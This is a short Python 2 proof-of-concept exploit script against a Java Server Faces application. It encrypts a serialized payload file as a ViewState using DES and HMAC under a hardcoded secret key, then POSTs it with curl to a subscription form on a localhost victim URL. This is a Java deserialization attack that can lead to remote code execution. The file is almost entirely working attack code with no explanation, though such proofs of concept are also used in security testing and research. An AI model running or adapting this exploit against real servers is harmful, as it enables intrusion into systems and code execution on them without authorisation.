import base64
from Crypto.Cipher import DES
import hmac
import hashlib
import socket
import os
import urllib

def padding_append(data):
    if len(data) % 8:
        for n in xrange(len(data)):
            if ((len(data) + n) % 8) == 0:
                data += chr(n) * n
                break

    return data

def encrypt_viewstate(viewstate, secret):
    secret = base64.b64decode(secret)
    des = DES.new(secret, DES.MODE_ECB)

    viewstate = padding_append(viewstate)
    viewstate = [viewstate[n:n+8] for n in xrange(0, len(viewstate), 8)]
    viewstate = "".join(map(des.encrypt, viewstate))
    viewstate += hmac.new(secret, viewstate, hashlib.sha1).digest()
    viewstate = base64.b64encode(viewstate)

    return viewstate

def create_payload():
    with open('payload_ping.ser', 'r') as fi: payload_ping = fi.read()
    payload = encrypt_viewstate(payload_ping, "SnNGOTg3Ni0=")
    payload = urllib.quote(payload.encode("ascii"))
    return payload

victim_url = "http://127.0.0.1:8081/userSubscribe.faces"

post_data = "j_id_jsp_1623871077_1%3Aemail=test%40hello.com&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState="

payload = create_payload()

os.system('curl -d \"' + post_data + payload + '\" -H \"Content-Type: application/x-www-form-urlencoded\" -X POST ' + victim_url)
